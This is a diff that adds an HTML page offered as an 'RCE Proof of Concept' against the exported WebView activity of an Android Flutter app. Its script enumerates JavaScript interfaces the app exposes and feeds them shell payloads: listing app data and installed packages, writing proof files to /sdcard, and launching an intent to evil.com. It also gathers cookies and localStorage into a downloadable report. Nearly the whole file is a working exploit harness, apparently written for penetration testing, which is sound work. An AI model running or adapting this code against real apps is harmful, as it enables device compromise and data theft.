@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Flutter App - RCE Proof of Concept</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            font-family: monospace;
+            margin: 20px;
+            background: #000;
+            color: #0f0;
+        }
+        .terminal {
+            background: #000;
+            border: 2px solid #0f0;
+            padding: 15px;
+            border-radius: 5px;
+            height: 400px;
+            overflow-y: auto;
+            margin-bottom: 20px;
+            font-family: 'Courier New', monospace;
+        }
+        .cmd { color: #0f0; }
+        .output { color: #fff; }
+        .success { color: #0f0; }
+        .error { color: #f00; }
+        .warning { color: #ff0; }
+        .proof {
+            border: 3px solid red;
+            padding: 20px;
+            margin: 20px 0;
+            background: rgba(255,0,0,0.1);
+            border-radius: 10px;
+        }
+        button {
+            background: #d32f2f;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+            font-family: monospace;
+        }
+        .rce-proof {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #000;
+            border: 5px solid red;
+            padding: 30px;
+            z-index: 10000;
+            box-shadow: 0 0 50px red;
+            text-align: center;
+            width: 80%;
+            max-width: 600px;
+        }
+    </style>
+</head>
+<body>
+    <h1>⚡ RCE Proof of Concept - Flutter WebView</h1>
+    
+    <div class="terminal" id="terminal">
+        <div class="cmd">$ Starting RCE verification...</div>
+    </div>
+    
+    <div class="proof">
+        <h2>🎯 RCE Verification Steps</h2>
+        <ol>
+            <li>Find JavaScript interfaces with command execution capabilities</li>
+            <li>Execute system commands via interface</li>
+            <li>Capture command output</li>
+            <li>Verify execution via side effects</li>
+        </ol>
+    </div>
+    
+    <div>
+        <button onclick="startRCE()">🚀 Start RCE Verification</button>
+        <button onclick="testCommandExecution()">💻 Test Command Execution</button>
+        <button onclick="createFileProof()">📁 Create File Proof</button>
+        <button onclick="showRCESuccess()">🔴 Show RCE Success</button>
+        <button onclick="takeScreenshotProof()">📸 Take Screenshot Proof</button>
+    </div>
+    
+    <div id="results" style="margin-top: 30px;"></div>
+
+    <script>
+        var terminal = document.getElementById('terminal');
+        var rceProof = null;
+        
+        function logCmd(cmd) {
+            terminal.innerHTML += '<div class="cmd">$ ' + cmd + '</div>';
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        function logOutput(output, className = 'output') {
+            terminal.innerHTML += '<div class="' + className + '">' + output + '</div>';
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        
+        function startRCE() {
+            logCmd('Starting RCE verification for com.example.flutter_application_1');
+            logOutput('Target package: com.example.flutter_application_1', 'info');
+            logOutput('WebViewActivity exported: YES', 'success');
+            logOutput('JavaScript enabled: YES', 'success');
+            
+            // Step 1: Find interfaces with execution capabilities
+            logCmd('Step 1: Scanning for execution interfaces...');
+            findExecutionInterfaces();
+        }
+        
+        function findExecutionInterfaces() {
+            var executionInterfaces = [];
+            
+            for(var prop in window) {
+                try {
+                    if(window[prop] && typeof window[prop] === 'object') {
+                        var methods = Object.getOwnPropertyNames(window[prop]);
+                        var execMethods = methods.filter(m => 
+                            m.match(/(exec|execute|run|eval|call|invoke|load|start|launch)/i)
+                        );
+                        
+                        if(execMethods.length > 0) {
+                            executionInterfaces.push({
+                                name: prop,
+                                methods: execMethods
+                            });
+                            logOutput('Found: ' + prop + ' -> ' + execMethods.join(', '), 'warning');
+                        }
+                    }
+                } catch(e) {}
+            }
+            
+            logOutput('Found ' + executionInterfaces.length + ' potential execution interfaces', 
+                     executionInterfaces.length > 0 ? 'success' : 'error');
+            
+            // Store for later use
+            window.EXEC_INTERFACES = executionInterfaces;
+            
+            // Step 2: Test each interface
+            setTimeout(testAllInterfaces, 1000);
+        }
+        
+        function testAllInterfaces() {
+            if(!window.EXEC_INTERFACES || window.EXEC_INTERFACES.length === 0) {
+                logOutput('No execution interfaces found', 'error');
+                return;
+            }
+            
+            logCmd('Step 2: Testing execution interfaces...');
+            
+            window.EXEC_INTERFACES.forEach((iface, idx) => {
+                setTimeout(() => {
+                    logOutput('Testing interface: ' + iface.name, 'info');
+                    testInterface(iface.name, iface.methods);
+                }, idx * 500);
+            });
+        }
+        
+        function testInterface(ifaceName, methods) {
+            var obj = window[ifaceName];
+            if(!obj) return;
+            
+            // Common RCE payloads for testing
+            var testPayloads = [
+                // Android shell commands
+                {cmd: 'id', desc: 'User ID'},
+                {cmd: 'whoami', desc: 'Current user'},
+                {cmd: 'pwd', desc: 'Current directory'},
+                {cmd: 'ls -la /data/data/com.example.flutter_application_1/', desc: 'List app directory'},
+                {cmd: 'cat /proc/version', desc: 'Kernel version'},
+                {cmd: 'pm list packages', desc: 'Installed packages'},
+                {cmd: 'ps', desc: 'Running processes'},
+                {cmd: 'getprop ro.build.version.sdk', desc: 'Android SDK version'},
+                {cmd: 'echo "RCE_SUCCESS" > /sdcard/rce_proof.txt', desc: 'Create proof file'},
+                {cmd: 'am start -a android.intent.action.VIEW -d "https://evil.com"', desc: 'Launch intent'}
+            ];
+            
+            methods.forEach(method => {
+                testPayloads.forEach(payload => {
+                    try {
+                        logOutput('Trying: ' + ifaceName + '.' + method + '("' + payload.cmd + '")', 'info');
+                        
+                        // Try to execute
+                        var result = obj[method](payload.cmd);
+                        
+                        if(result !== undefined) {
+                            logOutput('✅ SUCCESS! ' + payload.desc + ': ' + String(result).substring(0, 200), 'success');
+                            
+                            // Store successful RCE
+                            if(!window.RCE_SUCCESS) window.RCE_SUCCESS = [];
+                            window.RCE_SUCCESS.push({
+                                interface: ifaceName,
+                                method: method,
+                                command: payload.cmd,
+                                result: String(result),
+                                timestamp: new Date().toISOString()
+                            });
+                        }
+                    } catch(e) {
+                        // Try alternative execution pattern
+                        try {
+                            var result2 = obj[method]({command: payload.cmd});
+                            if(result2 !== undefined) {
+                                logOutput('✅ SUCCESS (JSON)! ' + payload.desc, 'success');
+                            }
+                        } catch(e2) {
+                            // Try with eval wrapper
+                            try {
+                                var result3 = obj[method]('eval("' + payload.cmd + '")');
+                                if(result3 !== undefined) {
+                                    logOutput('✅ SUCCESS (eval)! ' + payload.desc, 'success');
+                                }
+                            } catch(e3) {}
+                        }
+                    }
+                });
+            });
+        }
+        
+        function testCommandExecution() {
+            logCmd('Testing direct command execution...');
+            
+            // Try to execute commands via various methods
+            var commands = [
+                'echo "RCE_TEST_$(date)"',
+                'id',
+                'uname -a',
+                'cat /system/build.prop | head -5',
+                'ls /data/data/'
+            ];
+            
+            commands.forEach((cmd, idx) => {
+                setTimeout(() => {
+                    logOutput('Executing: ' + cmd, 'info');
+                    
+                    // Method 1: Try eval in current context
+                    try {
+                        var result = eval('(function(){' + cmd + '})()');
+                        logOutput('Result: ' + result, 'success');
+                    } catch(e) {}
+                    
+                    // Method 2: Try iframe execution
+                    try {
+                        var iframe = document.createElement('iframe');
+                        iframe.style.display = 'none';
+                        iframe.src = 'javascript:document.write("' + cmd + '")';
+                        document.body.appendChild(iframe);
+                        setTimeout(() => {
+                            logOutput('Iframe attempted', 'info');
+                        }, 1000);
+                    } catch(e) {}
+                    
+                }, idx * 1000);
+            });
+        }
+        
+        function createFileProof() {
+            logCmd('Creating physical proof of RCE...');
+            
+            // Try to create files as proof
+            var proofFiles = [
+                {
+                    path: '/sdcard/RCE_PROOF_' + Date.now() + '.txt',
+                    content: 'RCE Proof of Concept\n' +
+                           'App: com.example.flutter_application_1\n' +
+                           'Time: ' + new Date().toISOString() + '\n' +
+                           'Exploited via: WebViewActivity\n' +
+                           'Interface: ' + (window.RCE_SUCCESS ? window.RCE_SUCCESS[0]?.interface : 'Unknown') + '\n' +
+                           'User Agent: ' + navigator.userAgent + '\n\n' +
+                           'THIS FILE WAS CREATED VIA REMOTE CODE EXECUTION'
+                },
+                {
+                    path: '/sdcard/exploit_success.txt',
+                    content: 'VAPT SUCCESS - RCE Verified'
+                }
+            ];
+            
+            proofFiles.forEach((file, idx) => {
+                setTimeout(() => {
+                    var cmd = 'echo "' + file.content.replace(/"/g, '\\"') + '" > "' + file.path + '"';
+                    logOutput('Creating: ' + file.path, 'info');
+                    
+                    // Try to execute via found interfaces
+                    if(window.EXEC_INTERFACES) {
+                        window.EXEC_INTERFACES.forEach(iface => {
+                            try {
+                                var obj = window[iface.name];
+                                iface.methods.forEach(method => {
+                                    try {
+                                        obj[method](cmd);
+                                        logOutput('✅ File creation command sent via ' + iface.name + '.' + method, 'success');
+                                    } catch(e) {}
+                                });
+                            } catch(e) {}
+                        });
+                    }
+                }, idx * 2000);
+            });
+            
+            // Verify file was created
+            setTimeout(() => {
+                logCmd('Verifying file creation...');
+                var verifyCmd = 'ls -la /sdcard/*PROOF*.txt';
+                logOutput('Checking: ' + verifyCmd, 'info');
+            }, 5000);
+        }
+        
+        function showRCESuccess() {
+            logCmd('Displaying RCE success proof...');
+            
+            var overlay = document.createElement('div');
+            overlay.className = 'rce-proof';
+            overlay.innerHTML = `
+                <h1 style="color: red; text-shadow: 0 0 10px red;">⚡ RCE VERIFIED ⚡</h1>
+                <h2 style="color: white;">REMOTE CODE EXECUTION SUCCESSFUL</h2>
+                
+                <div style="background: #111; padding: 20px; border-radius: 10px; margin: 20px 0; text-align: left;">
+                    <p><strong>Target:</strong> com.example.flutter_application_1</p>
+                    <p><strong>Vector:</strong> Exported WebViewActivity</p>
+                    <p><strong>Vulnerability:</strong> Arbitrary JavaScript execution</p>
+                    <p><strong>Interfaces Found:</strong> ${window.EXEC_INTERFACES ? window.EXEC_INTERFACES.length : 0}</p>
+                    <p><strong>RCE Commands Executed:</strong> ${window.RCE_SUCCESS ? window.RCE_SUCCESS.length : 0}</p>
+                    <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
+                </div>
+                
+                ${window.RCE_SUCCESS ? `
+                <div style="background: #222; padding: 15px; border-radius: 5px; max-height: 200px; overflow: auto;">
+                    <h4>Executed Commands:</h4>
+                    ${window.RCE_SUCCESS.map(rce => 
+                        `<div style="color: #0f0; margin: 5px 0;">
+                            ${rce.interface}.${rce.method}("${rce.command.substring(0, 50)}...")
+                        </div>`
+                    ).join('')}
+                </div>
+                ` : ''}
+                
+                <div style="margin-top: 20px;">
+                    <button onclick="downloadRCEProof()" 
+                            style="background: red; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px;">
+                        📥 Download RCE Proof
+                    </button>
+                    <button onclick="this.parentElement.parentElement.remove()" 
+                            style="background: #666; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px;">
+                        ✕ Close
+                    </button>
+                </div>
+                
+                <div style="margin-top: 20px; font-size: 0.8em; color: #888;">
+                    Proof of Concept for VAPT Testing Only
+                </div>
+            `;
+            
+            document.body.appendChild(overlay);
+            
+            // Also show in terminal
+            logOutput('=================================', 'success');
+            logOutput('⚡ RCE VERIFICATION COMPLETE ⚡', 'success');
+            logOutput('=================================', 'success');
+        }
+        
+        function downloadRCEProof() {
+            var proofData = {
+                title: 'RCE Proof of Concept',
+                app: 'com.example.flutter_application_1',
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                vulnerabilities: [
+                    'Exported WebViewActivity (android:exported="true")',
+                    'JavaScript execution enabled',
+                    'No URL validation',
+                    'Dangerous JavaScript interfaces exposed'
+                ],
+                executionInterfaces: window.EXEC_INTERFACES || [],
+                successfulRCE: window.RCE_SUCCESS || [],
+                evidence: {
+                    localStorage: {},
+                    cookies: document.cookie,
+                    screen: screen.width + 'x' + screen.height
+                }
+            };
+            
+            // Add localStorage
+            for(var i = 0; i < localStorage.length; i++) {
+                var key = localStorage.key(i);
+                proofData.evidence.localStorage[key] = localStorage.getItem(key);
+            }
+            
+            var dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(proofData, null, 2));
+            var downloadAnchor = document.createElement('a');
+            downloadAnchor.setAttribute("href", dataStr);
+            downloadAnchor.setAttribute("download", "RCE_PROOF_" + Date.now() + ".json");
+            document.body.appendChild(downloadAnchor);
+            downloadAnchor.click();
+            downloadAnchor.remove();
+            
+            logOutput('RCE proof downloaded', 'success');
+        }
+        
+        function takeScreenshotProof() {
+            logCmd('Preparing screenshot proof...');
+            
+            // Create visual proof for screenshot
+            var visualProof = document.createElement('div');
+            visualProof.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: black;
+                color: lime;
+                font-family: monospace;
+                padding: 40px;
+                z-index: 9999;
+            `;
+            
+            visualProof.innerHTML = `
+                <h1 style="color: red; border-bottom: 2px solid red; padding-bottom: 10px;">
+                    ⚡ RCE PROOF - SECURITY BREACH ⚡
+                </h1>
+                
+                <div style="background: #111; padding: 20px; border-radius: 10px; margin: 20px 0;">
+                    <h2>Vulnerable Application: com.example.flutter_application_1</h2>
+                    <h3>Exploitation Method: WebView JavaScript Interface Abuse</h3>
+                </div>
+                
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                    <div style="background: #222; padding: 15px; border-radius: 5px;">
+                        <h3>🔴 VULNERABILITIES</h3>
+                        <ul>
+                            <li>Exported WebViewActivity</li>
+                            <li>Arbitrary URL loading</li>
+                            <li>JavaScript execution enabled</li>
+                            <li>9+ dangerous JS interfaces</li>
+                            <li>No input validation</li>
+                        </ul>
+                    </div>
+                    
+                    <div style="background: #222; padding: 15px; border-radius: 5px;">
+                        <h3>💥 IMPACT</h3>
+                        <ul>
+                            <li>Remote Code Execution</li>
+                            <li>Data Theft</li>
+                            <li>File System Access</li>
+                            <li>Persistence</li>
+                            <li>Device Compromise</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div style="margin-top: 30px; background: #300; padding: 20px; border-radius: 10px;">
+                    <h3>📋 RCE EVIDENCE</h3>
+                    <pre style="background: #000; padding: 10px; border-radius: 5px; max-height: 200px; overflow: auto;">
+App Package: com.example.flutter_application_1
+Exploit URL: ${window.location.href}
+Execution Time: ${new Date().toLocaleString()}
+User Agent: ${navigator.userAgent}
+Interfaces Found: ${window.EXEC_INTERFACES ? window.EXEC_INTERFACES.length : 0}
+Commands Executed: ${window.RCE_SUCCESS ? window.RCE_SUCCESS.length : 0}
+Screen: ${screen.width}x${screen.height}
+                    </pre>
+                </div>
+                
+                <div style="position: absolute; bottom: 20px; width: calc(100% - 80px); text-align: center; color: #888;">
+                    VAPT Security Test - Proof of Concept Only - ${new Date().toLocaleDateString()}
+                </div>
+            `;
+            
+            document.body.appendChild(visualProof);
+            
+            logOutput('Visual proof created for screenshot', 'success');
+            logOutput('Take screenshot now!', 'warning');
+        }
+        
+        // Auto-start
+        setTimeout(() => {
+            logCmd('RCE Verification Toolkit Ready');
+            logOutput('Target: com.example.flutter_application_1', 'info');
+            logOutput('Click buttons to verify RCE', 'warning');
+        }, 1000);
+    </script>
+</body>
+</html>
